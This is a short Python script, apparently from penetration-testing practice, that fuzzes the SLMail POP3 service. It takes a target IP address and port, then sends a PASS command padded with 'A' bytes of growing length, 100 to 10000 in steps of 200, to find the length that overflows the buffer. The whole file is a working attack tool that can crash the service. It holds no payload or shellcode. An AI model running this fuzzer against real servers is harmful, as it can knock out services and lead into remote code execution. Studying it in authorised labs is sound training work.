#!/usr/bin/python3

import sys,socket
from time import sleep


print("*************SLMAIL POP3 vulnerability**********")
ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")

if(len(ip_address)<=0) or (len(port_number)<=0): 
    if(len(ip_address)>0) and (len(port_number)<=0): 
        print("Port number field is empty")
    elif(len(ip_address)<=0) and (len(port_number)>0): 
        print("IP address field is empty")
    else:
        print("Issues with the user input")
elif(len(ip_address)>0) and (len(port_number)>0): 
    size=100
    while(size<=10000):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address, int(port_number)))
        print(f"Sending buffer --> {size}")
        s.send((b"USER TEST \r\n"))
        s.send((b"PASS " + b"A" * size + b"\r\n"))
        s.close()
        size=size+200
        sleep(1)
